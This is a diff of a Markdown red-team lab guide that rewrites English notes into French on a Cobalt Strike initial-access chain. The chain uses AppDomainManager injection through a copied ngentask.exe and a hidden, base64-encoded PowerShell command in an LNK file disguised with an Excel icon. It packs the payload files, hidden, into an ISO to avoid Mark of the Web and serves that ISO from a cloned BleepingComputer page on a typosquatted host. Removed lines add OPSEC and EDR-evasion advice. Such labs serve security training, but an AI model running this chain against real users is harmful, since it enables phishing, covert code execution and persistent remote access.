@@ -412,51 +412,32 @@ Le bloc suivant reprend le transfert du fichier de l’exercice vers le dossier 
 	cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\deals\
 	```
 
-===
+---
 
-## NGenTask
+## NGenTask — Chargement avec .NET Framework
 
-> **Why ngentask.exe — and why the WinSxS version specifically:**
->
-> `ngentask.exe` is the .NET Native Image Generator task runner — a signed Microsoft binary
-> that is part of the .NET Framework. It does nothing visible when executed with no arguments.
->
-> The version in `WinSxS` is an older build. WinSxS (Windows Side-by-Side) is a component
-> store that keeps multiple versions of system DLLs and executables to support compatibility.
-> Older .NET Framework builds in WinSxS are less patched and more likely to still follow the
-> DLL search order that allows AppDomainManager injection via env vars.
->
-> When `ngentask.exe` starts, the .NET runtime checks for `APPDOMAIN_MANAGER_TYPE` and
-> `APPDOMAIN_MANAGER_ASM` environment variables. If set, the runtime loads the specified
-> assembly as the AppDomainManager — **before** ngentask's own code runs. Your
-> `DomainManager.InitializeNewDomain()` fires immediately, spawning and hollowing Edge,
-> then ngentask exits silently. The entire execution is: signed Microsoft binary runs →
-> your DLL loads → beacon spawned in Edge → ngentask exits.
->
-> **OPSEC:** SAFE. `ngentask.exe` is a signed Microsoft binary. Its execution does not
-> appear suspicious. The APPDOMAIN env vars are set in the current process environment
-> only — no registry writes, no disk changes. The only disk artifact is `AppDomainHijack.dll`.
+### Comprendre le rôle de `ngentask.exe`
 
-1. Copy the SxS version of ngentask.exe into the deals payload directory.
+`ngentask.exe` appartient aux outils .NET Framework de Microsoft. Le magasin `WinSxS` peut conserver plusieurs versions des composants Windows pour assurer la compatibilité.
+
+Le scénario étudie la réaction du runtime lorsque les variables `APPDOMAIN_MANAGER_TYPE` et `APPDOMAIN_MANAGER_ASM` désignent une classe de type `AppDomainManager`. Le cours illustre notamment l’appel à `InitializeNewDomain()`.
+
+**Observation :** un exécutable signé peut charger des assemblies supplémentaires. Les contrôles de sécurité doivent donc examiner les modules, les variables d’environnement et les appels mémoire associés, et pas seulement la signature du processus.
+
+La commande suivante concerne la copie de la version `WinSxS` utilisée dans le lab.
 
 	```Terminal-nocolor
     cp C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_b03f5f7f11d50a3a_4.0.15805.0_none_d4039dd5692796db\ngentask.exe C:\Payloads\deals\
     ```
 
-> **Why copy it into the deals directory?** The AppDomainManager injection requires the DLL
-> (`AppDomainHijack.dll`) to be resolvable by the .NET runtime when loading it. The simplest
-> way is to have both `ngentask.exe` and `AppDomainHijack.dll` in the same directory — the
-> runtime searches the app's directory first. Running `ngentask.exe` from `C:\Payloads\deals\`
-> with the DLL present in the same directory satisfies this requirement.
+> **Pourquoi ce répertoire ?** Le dossier `C:\Payloads\deals\` sert de point de regroupement des fichiers du scénario. Le comportement de chargement de l’assembly dépend notamment de son identité et des chemins accessibles au runtime.
 
-### Sanity test — verify the technique works before building the delivery chain
+### Vérifier le comportement sur la workstation du lab
 
-> **EXAM RELEVANCE:** This sanity test is exactly what you do on exam day on the foothold
-> workstation — set the env vars, run `ngentask.exe`. No LNK, no ISO, no social engineering.
-> This is your initial beacon spawn sequence.
+Cette vérification correspond à l’environnement **Assume Breach** : les identifiants et la session de test sont déjà disponibles. Les étapes du document leurre, du raccourci LNK et de l’ISO ne sont pas requises pour cette partie.
 
-1. Launch Cobalt Strike and connect to the team server.
-1. Move into the deals payload directory and set the AppDomain environment variables:
+1. Se connecter au team server Cobalt Strike.
+2. Ouvrir le dossier de l’exercice et examiner les deux variables d’environnement `APPDOMAIN_MANAGER_*`.
 
 	```PowerShell-linenums
     cd C:\Payloads\deals
@@ -464,74 +445,44 @@ Le bloc suivant reprend le transfert du fichier de l’exercice vers le dossier 
     $env:APPDOMAIN_MANAGER_ASM = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
     ```
 
-> **What these environment variables do:**
+> **Variables d’environnement :**
 >
-> `APPDOMAIN_MANAGER_TYPE` — the fully-qualified type name of your custom `AppDomainManager`
-> class. Format: `<Namespace>.<ClassName>`. Here: `AppDomainHijack.DomainManager`.
+> - `APPDOMAIN_MANAGER_TYPE` désigne le nom complet de la classe .NET (exemple : `AppDomainHijack.DomainManager`).
+> - `APPDOMAIN_MANAGER_ASM` désigne l’identité de l’assembly, avec son nom, sa version, sa culture et son `PublicKeyToken`.
 >
-> `APPDOMAIN_MANAGER_ASM` — the assembly identity of your DLL. Format matches the .NET
-> assembly identity format: `<AssemblyName>, Version=<version>, Culture=<culture>, PublicKeyToken=<token>`.
-> Since your DLL is unsigned (`PublicKeyToken=null`), the token is `null`.
+> Ces paramètres sont associés à l’environnement de la session concernée ; ils ne sont pas nécessairement écrits dans le Registry ou conservés après la fermeture du processus.
 >
-> When `ngentask.exe` starts, the CLR reads these two env vars and loads your DLL,
-> instantiates `DomainManager`, and calls `InitializeNewDomain()`. This is a legitimate
-> .NET Framework feature being abused.
->
-> **These vars are set only in the current PowerShell session's environment** — they are
-> not written to disk or the registry. They disappear when the session ends.
+> Dans le scénario, le runtime .NET Framework lit ces valeurs pendant le démarrage de `ngentask.exe`.
 
-<img src="/images/initial-access-lab-04.png" width=800>  
+<img src="/images/initial-access-lab-04.png" width=800>
 
-1. Run ```.\ngentask.exe```
+3. Dans la session du lab, exécuter `.\ngentask.exe`.
+4. Vérifier si une nouvelle connexion Beacon est visible dans Cobalt Strike.
 
-⚠️ A new Beacon should appear, running in msedge.exe.
+**Contrôles de la session :** examiner l’identité du compte avec `getuid` et le processus hôte avec `process_browser`, puis comparer les résultats aux attentes du lab.
 
-> **What to check after beacon appears:**
 > ```cs
 > beacon> getuid          // confirm running as the expected user
 > beacon> process_browser // GUI tab — confirm beacon PID is inside msedge.exe, check for EDR processes
 > ```
-> If no beacon appears: check that the malleable C2 profile is loaded (docker logs), that
-> the http listener is active, and that `AppDomainHijack.dll` is in the same CWD as
-> `ngentask.exe`.
 
-===
+> **Dépannage :** en l’absence de connexion, vérifier que le listener HTTP du lab est actif, que le Malleable C2 Profile a bien été chargé et que les fichiers du scénario se trouvent dans le répertoire attendu.
 
 ---
 
-> ## EXAM DAY STOPS HERE — Steps below are for phishing delivery only
->
-> The sections below (Decoy, Trigger, Container, Delivery) build a social engineering
-> package to trick a user into executing the payload without knowing they are running malware.
->
-> **In the assume-breach exam scenario you will NOT do any of this.** You already have
-> credentials and can log in to the workstation. Run the env vars + `ngentask.exe` directly.
->
-> Study the sections below to understand real-world phishing tradecraft — they may appear
-> in future engagements or as context for OPSEC questions — but do not spend exam time
-> building a decoy or LNK when you have direct workstation access.
+## Partie complémentaire — Livraison à distance
 
----
+**Cette partie n’est pas nécessaire dans le scénario d’examen Assume Breach.** Les sections suivantes décrivent un exercice pédagogique portant sur les leurres et sur la façon dont les mécanismes de sécurité de Windows peuvent être sollicités lors d’une livraison à distance.
 
-# Decoy
+### Document leurre (Decoy)
 
-> **Why a decoy file exists:**
->
-> If the LNK trigger runs silently with no visible output, a suspicious user notices that
-> nothing happened after clicking the file and may report it to the security team. A decoy
-> opens a legitimate-looking document alongside the payload, so the user sees normal
-> behaviour. The payload runs in the background — the user sees an Excel spreadsheet.
->
-> **OPSEC:** SAFE — the decoy is a genuine Excel file with no macros. It is opened via
-> `start deals.xlsx` in the LNK trigger command, which is a normal file-open action.
+**Principe :** un document Office réel peut être associé à un raccourci. Le lab utilise un classeur Excel `deals.xlsx` pour illustrer ce que voit l’utilisateur, en parallèle des opérations effectuées par le raccourci.
 
-Next, create a decoy file.
+**Observation de sécurité :** un document sans macros n’implique pas que les éléments qui le lancent soient légitimes. Les associations de fichiers, raccourcis et commandes parent-enfant doivent être examinés séparément.
 
-1. Open Excel and create a new blank workbook.
-
-⚠️ If you cannot create a workbook, close Excel, launch Terminal as a local admin, and run the following command: `& 'C:\Program Files\Microsoft Office\Office16\OSPPREARM.EXE'`
-
-3. Add some dummy deals data.
+1. Créer un classeur de démonstration dans Excel.
+2. Utiliser les données fictives de l’exercice pour reconnaître le document.
+3. Le cours mentionne aussi l’outil Office `OSPPREARM.EXE` dans le contexte de son environnement de lab.
 
     ```xlsx-nocolor
     id  product      discount  code
@@ -547,46 +498,24 @@ Next, create a decoy file.
     10  Otcom        54%       36987-2281
     ```
 
-1. Save the workbook as *C:\Payloads\deals\deals.xlsx*.
-2. Close Excel.
+1. Enregistrer le classeur de démonstration sous `C:\Payloads\deals\deals.xlsx`, puis fermer Excel.
 
-<img src="/images/initial-access-lab-05.png" width=860>  
+<img src="/images/initial-access-lab-05.png" width=860>
 
-===
+---
 
-# Trigger
+## Raccourci LNK — Comprendre le déclencheur
 
-> **Why a LNK trigger and not just a bat/exe:**
->
-> A `.lnk` (Shell Link / shortcut) file has two properties that make it ideal for phishing:
-> 1. **Windows Explorer hides the `.lnk` extension by default** — even with "show file
->    extensions" enabled, `.lnk` is hidden. A file named `deals.xlsx.lnk` displays as
->    `deals.xlsx` in Explorer. The victim sees what looks like an Excel spreadsheet.
-> 2. **You can set any icon** — using the Excel icon makes the file look exactly like a
->    spreadsheet. The victim has no visual indication it is a shortcut.
->
-> The LNK runs `cmd.exe` with a hidden PowerShell command that:
-> - Opens the decoy spreadsheet (`start deals.xlsx`) so the user sees normal behaviour
-> - Sets the APPDOMAIN env vars in memory
-> - Runs `ngentask.exe` to execute the payload
->
-> **OPSEC — CAUTION:** The execution chain is:
-> `Explorer.exe → cmd.exe (/C) → powershell.exe (-w hidden -enc) → ngentask.exe`
->
-> This parent-child chain is visible to EDR:
-> - `cmd.exe` spawned by `Explorer.exe` when a user double-clicks → not suspicious by itself
-> - `powershell.exe` spawned by `cmd.exe` with `-enc` (base64 encoded command) → flagged
->   by many EDR rules as obfuscation
-> - `ngentask.exe` spawned by `powershell.exe` → unusual parent for this binary
->
-> For a real engagement, replace the `-enc` PowerShell invocation with a less-signatured
-> execution method (e.g. call `ngentask.exe` via a COM object, or use `wscript.exe` with
-> a JS dropper instead of PowerShell). For the CRTO lab, the technique is demonstrated
-> as-is — the focus is on the AppDomainManager injection, not the trigger OPSEC.
+**Principe :** un fichier `.lnk` est un raccourci Windows et non un document Office. Le nom et l’icône affichés peuvent différer de la véritable action exécutée.
 
-Now for the trigger. The user will run this which will subsequently launch the decoy and payload at the same time.
+Le lab montre un raccourci associé à un fichier Excel, avec une chaîne de processus comprenant `Explorer.exe`, `cmd.exe`, `powershell.exe` et `ngentask.exe`. Dans le scénario, le raccourci ouvre le document de démonstration et déclenche également d’autres opérations.
 
-1. Generate a PowerShell one-liner that will set the required environment variables and execute ngentask.exe.
+**Points de détection :**
+- Une commande PowerShell encodée avec `-enc` peut être un signal d’alerte.
+- La présence de `powershell.exe` et `ngentask.exe` dans la même chaîne parent-enfant mérite d’être examinée.
+- L’icône d’un fichier n’est pas une preuve de son type réel.
+
+Le bloc suivant est la commande PowerShell d’exemple reproduite depuis le lab.
 
     ```PowerShell-linenums
     cd C:\Payloads\deals\
@@ -594,13 +523,13 @@ Now for the trigger. The user will run this which will subsequently launch the d
     $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
     ```
 
-> **What this does:** Builds the payload command string and base64-encodes it (Unicode, as
-> PowerShell's `-enc` parameter expects UTF-16LE encoding). The encoded string is stored in
-> `$enc` and embedded into the LNK shortcut's `Arguments` field in the next step.
-> PowerShell's `-enc` flag accepts base64-encoded commands — this avoids needing to escape
-> quotes and special characters in the LNK `Arguments` field.
+> **Lecture du code :** la variable `$cmd` contient une commande, puis `$enc` stocke sa représentation en Base64. Pour l’option PowerShell `-enc`, le contenu est encodé selon le format UTF-16LE.
+>
+> Un encodage Base64 ne constitue pas une mesure de chiffrement. Le contenu peut être décodé et analysé.
 
-1. In the same window, create the shortcut that will execute the above one-liner and open the decoy.
+### Examiner les propriétés du raccourci
+
+Le bloc suivant illustre la structure d’un raccourci Windows construit avec l’interface COM `WScript.Shell`.
 
     ```PowerShell-linenums
     $wsh = New-Object -ComObject WScript.Shell
@@ -611,170 +540,91 @@ Now for the trigger. The user will run this which will subsequently launch the d
     $lnk.Save()
     ```
 
-> **What each LNK property does:**
+> **Propriétés du fichier LNK :**
 >
-> `TargetPath = "%COMSPEC%"` — runs `cmd.exe`. The LNK calls cmd rather than PowerShell
-> directly because PowerShell cannot be set as the target of a shortcut without showing the
-> console window. `cmd.exe /C` is the wrapper.
+> - `TargetPath` définit le programme cible du raccourci.
+> - `Arguments` contient les paramètres transmis au programme.
+> - `IconLocation` indique l’icône affichée dans Explorer.
 >
-> `Arguments = "/C start deals.xlsx && powershell.exe -w hidden -enc $enc"` — cmd runs two
-> things: `start deals.xlsx` (opens the decoy spreadsheet via its default app) and then
-> `powershell.exe -w hidden -enc $enc` (runs the payload command invisibly). `-w hidden`
-> prevents a PowerShell window from appearing.
->
-> `IconLocation = "EXCEL.EXE,0"` — sets the LNK icon to Excel's icon (index 0 = the main
-> application icon). The victim sees an Excel-looking file. Combined with the hidden `.lnk`
-> extension, this is the deception.
+> Pour le contrôle de sécurité, ces champs doivent être analysés conjointement. Une icône Excel peut représenter un raccourci exécutant un autre programme.
 
-<img src="/images/initial-access-lab-trigger.png" width=1024>  
+<img src="/images/initial-access-lab-trigger.png" width=1024>
 
-## Validate and sanity test
+### Vérification dans l’environnement de formation
 
-1. Open Explorer and navigate to *C:\Payloads\deals*.
-2. Double-click on *deals.xlsx.lnk*.
+Le cours présente le fichier `deals.xlsx.lnk` et le classeur de démonstration. La validation du lab repose sur l’observation du document et de la nouvelle session Cobalt Strike.
 
-⚠️ The spreadsheet will open and a new Beacon should appear at the same time.
+<img src="/images/initial-access-lab-06.png" width=1024>
 
-<img src="/images/initial-access-lab-06.png" width=1024>  
+---
 
-===
+## Conteneur ISO — Étudier Mark of the Web
 
-# Container
+**Mark of the Web (MotW)** repose notamment sur la zone de provenance associée aux fichiers Windows, par exemple le flux `Zone.Identifier` sur NTFS. Ce marquage peut influencer les avertissements SmartScreen et le comportement de Protected View dans Office.
 
-> **Why an ISO container — Mark of the Web (MotW):**
->
-> When a file is downloaded from the internet (browser, email client, web download), Windows
-> attaches an NTFS Alternate Data Stream called `Zone.Identifier` to the file. This is the
-> **Mark of the Web (MotW)**. MotW causes:
-> - Office documents → open in **Protected View** (macros disabled, content blocked)
-> - Executables → trigger **SmartScreen** warnings before running
-> - LNK files → trigger a warning dialog before executing
->
-> **ISO and IMG files do NOT propagate MotW to their contents.** When you mount an ISO
-> and access the files inside, those files do not inherit the MotW of the ISO container.
-> The LNK inside the ISO has no MotW → no warning dialog → victim double-clicks it and
-> the payload runs without any security prompt.
->
-> **OPSEC:** SAFE — mounting and browsing an ISO is a normal user action (software
-> distribution, game installs). The ISO itself may get a SmartScreen check, but once
-> mounted, the files inside run without MotW friction.
->
-> The `-H` flag to PackMyPayload hides files inside the ISO — only the LNK trigger is
-> visible when the victim opens the mounted ISO. The DLL, ngentask.exe, and the real
-> xlsx are hidden, preventing the victim from noticing the malicious components.
+Le lab compare le comportement des fichiers récupérés directement et de ceux contenus dans une image ISO. La propagation de MotW dépend aussi de la version de Windows, des correctifs et du mécanisme d’extraction ; il ne faut pas considérer son absence comme garantie.
 
-It's time to package all of our files.  We want to hide everything, except the lnk trigger.
+Le paramètre `-H` de l’outil PackMyPayload est présenté dans les notes comme un mécanisme de gestion de la visibilité des fichiers dans l’image de l’exercice.
 
-1. Open Ubuntu (WSL) in Terminal, and use PackMyPayload to package all the files into an ISO.
+### Examiner l’archive du lab
+
+Le bloc suivant indique la commande PackMyPayload utilisée par le cours pour produire le fichier `deals.iso`.
 
     ```ubuntu-nocolor
     python3 /mnt/c/Tools/PackMyPayload/PackMyPayload.py -H deals.xlsx,ngentask.exe,AppDomainHijack.dll /mnt/c/Payloads/deals/ /mnt/c/Payloads/deals/deals.iso
     ```
 
-> **Command breakdown:**
+> **Éléments de la commande :**
 >
-> `python3 PackMyPayload.py` — the tool that creates ISO/IMG/ZIP containers
+> - `PackMyPayload.py` est l’outil de création d’images ou d’archives.
+> - L’option `-H` prend une liste de fichiers dans le scénario.
+> - `/mnt/c/Payloads/deals/` correspond au répertoire source.
+> - `/mnt/c/Payloads/deals/deals.iso` désigne le fichier de sortie.
 >
-> `-H deals.xlsx,ngentask.exe,AppDomainHijack.dll` — hide these files inside the ISO.
-> They are included but not visible when the victim browses the mounted ISO in Explorer.
->
-> `/mnt/c/Payloads/deals/` — source directory. All files here are packed into the ISO.
->
-> `/mnt/c/Payloads/deals/deals.iso` — output ISO file path.
->
-> **Result:** victim mounts the ISO → sees only `deals.xlsx.lnk` (looks like a spreadsheet)
-> → double-clicks → decoy opens, payload executes → all hidden components ran without the
-> victim ever seeing them.
+> Lors de l’analyse d’une archive provenant d’une source non fiable, il faut examiner les raccourcis, les fichiers intégrés et les mécanismes d’exécution qu’elle contient.
 
-## Final Validation sanity Check
+### Vérifier le contenu de l’ISO dans le lab
 
-1. Double-click on the ISO to mount it and you should only see the trigger.
-2. Double-click on the trigger a final time, and the decoy and Beacon should appear.
+Les supports présentent le montage de `deals.iso` et l’observation des éléments visibles dans Explorer.
 
-<img src="/images/initial-access-lab-07.png" width=1024>  
-
-===
-
-# Delivery
-
-> **What this section is:** Simulating the final step of a phishing campaign — getting the
-> ISO to the victim and triggering the download. In the lab this is simulated by browsing
-> to a CS-hosted page. In a real engagement this would be a phishing email with a link,
-> a cloned login page with an automatic download, or a vishing call directing the target
-> to a URL.
->
-> **CS Site Management — two components working together:**
->
-> 1. **Host File** — CS's built-in web server serves the ISO file at a specified URI and
->    hostname. The victim's browser downloads `deals.iso` when it visits the URI.
->
-> 2. **Clone Site** — CS fetches a legitimate webpage (here: `deals.bleepingcomputer.com`),
->    mirrors it locally, and serves it at your URI. When the victim visits your cloned page,
->    they see a legitimate-looking website. CS attaches the hosted ISO as an automatic
->    download — when the victim clicks anything on the cloned page, the ISO downloads.
->
-> **Why `www.bleepincomputer.com` as the Local Host:**
-> The HTTP `Host:` header of all traffic to your team server uses this value. Network
-> monitoring sees `Host: www.bleepincomputer.com` — a legitimate security news site — not
-> a raw IP address. See the defence-evasion lab for the full explanation of host header
-> masquerading.
->
-> **OPSEC of this delivery method:**
-> - SAFE: The victim visits what looks like a real website (cloned content)
-> - SAFE: The ISO download appears to come from a legitimate-looking hostname
-> - CAUTION: The clone is served over HTTP (not HTTPS) — a sharp user may notice the lack
->   of padlock. In a real engagement use a valid TLS certificate on the team server.
-> - CAUTION: CS's site clone is not a perfect mirror — some JS/CSS may fail to load.
->   Test the clone before using it against a real target.
-
-We're finally ready to deliver the payload to the victim simulating social engineering, phishing, vishing, or other trickery.
-
-1. Host the ISO on Cobalt Strike's built-in web server.
-  1. Go to **Site Management > Host File**.
-  2. File: ```C:\Payloads\deals\deals.iso```
-  3. Local URI: ```/deals.iso```
-  4. Local Host: ```www.bleepincomputer.com```
-  5. Click **Launch**.
-
-> **What this does:** CS's team server begins serving `deals.iso` at
-> `http://www.bleepincomputer.com/deals.iso`. Any request to that URI returns the ISO file.
-
-1. Clone a legitimate web page.
-  1. **Go to Site Management > Clone Site** 
-  1. Clone URL: ```https://deals.bleepingcomputer.com```
-  2. Local URI: ```/deals```
-  3. Local Host: ```www.bleepincomputer.com```
-  4. Attack: Click the **...** button and select the hosted ISO.
-  5. Click **Clone**.
-
-> **What this does:** CS fetches the real `https://deals.bleepingcomputer.com` content and
-> serves a copy at `http://www.bleepincomputer.com/deals`. The "Attack" field links the
-> hosted ISO to this page — when the victim visits `/deals`, the ISO begins downloading
-> automatically alongside the legitimate-looking page content.
-
-<img src="/images/initial-access-lab-08.png" width=1024>  
-
-1. Switch over to @lab.VirtualMachine(lon-wkstn-1).SelectLink and login with ```@lab.VirtualMachine(lon-wkstn-1).Password```.
-
-1. Open Microsoft Edge and browse to ```http://www.bleepincomputer.com/deals```
-1. Click *Open file* when deals.iso downloads.
-1. Double-click on *deals.xlsx* and the decoy will open.
-1. Switch back to @lab.VirtualMachine(attacker-desktop).SelectLink and a Beacon should be checking in from msedge.exe, as the user pchilds.
-
-> **What just happened — the full chain:**
-> 1. Victim browsed to cloned bleepingcomputer page → ISO auto-downloaded
-> 2. Victim mounted the ISO → saw only `deals.xlsx.lnk` (looks like a spreadsheet)
-> 3. Victim double-clicked → `cmd.exe` ran → PowerShell set APPDOMAIN env vars → `ngentask.exe` executed
-> 4. .NET runtime loaded `AppDomainHijack.dll` → `InitializeNewDomain()` fired
-> 5. `msedge.exe` spawned suspended → process hollowed with beacon shellcode → thread resumed
-> 6. Beacon checked in from `msedge.exe` running as the victim user (`pchilds`)
-> 7. Victim saw the decoy `deals.xlsx` spreadsheet — nothing appeared to go wrong
-
-⚠️ In this lab you have created an initial access infection chain, leveraging DLL sideloading with ngentask.exe.  
+<img src="/images/initial-access-lab-07.png" width=1024>
 
 ---
 
-## Exam Day Summary — What You Actually Do
+## Livraison web — Comprendre le scénario
+
+Cette section illustre un dispositif de **distribution de fichier** et de **clonage de page** dans l’environnement d’exercice Cobalt Strike. Elle vise à comprendre les risques associés aux pages de téléchargement imitant un site réel.
+
+Deux fonctions de Site Management sont présentées :
+
+1. **Host File** : met un fichier à disposition sous une URI.
+2. **Clone Site** : crée une copie locale d’une page web pour l’environnement d’entraînement.
+
+Le lab utilise notamment les valeurs `/deals.iso`, `/deals`, `deals.bleepingcomputer.com` et `www.bleepincomputer.com`. Ces chaînes appartiennent à son exemple et ne prouvent pas qu’une page est légitime.
+
+**Signaux à vérifier :** incohérences de domaine, protocole HTTP/S, comportement de téléchargement, en-têtes `Host` et scripts exécutés depuis une page. Le clonage d’un site peut être incomplet, notamment pour certains fichiers JavaScript et CSS.
+
+### Hébergement présenté dans Cobalt Strike
+
+Les notes illustrent **Site Management > Host File**, puis la fonction **Clone Site**. Les valeurs et chemins de l’exercice restent les suivants :
+
+- Fichier : `C:\Payloads\deals\deals.iso`
+- URI du fichier : `/deals.iso`
+- URI de la page : `/deals`
+- Nom d’hôte du lab : `www.bleepincomputer.com`
+- Page de référence : `https://deals.bleepingcomputer.com`
+
+<img src="/images/initial-access-lab-08.png" width=1024>
+
+### Observer le résultat dans le lab
+
+Le scénario final présente les étapes d’accès à la page de démonstration, le fichier téléchargé, son ouverture, puis le résultat visible dans la console Cobalt Strike. Il rappelle la différence entre l’apparence d’un document et la chaîne de programmes réellement lancés.
+
+**Bilan :** AppDomainManager, fichiers LNK, MotW, ISO et clonage web constituent des sujets d’analyse distincts. L’étape de phishing reste **hors du parcours Assume Breach**.
+
+---
+
+## Récapitulatif de l’examen — Scénario Assume Breach
 
 ```
 EXAM (assume-breach — direct workstation access):
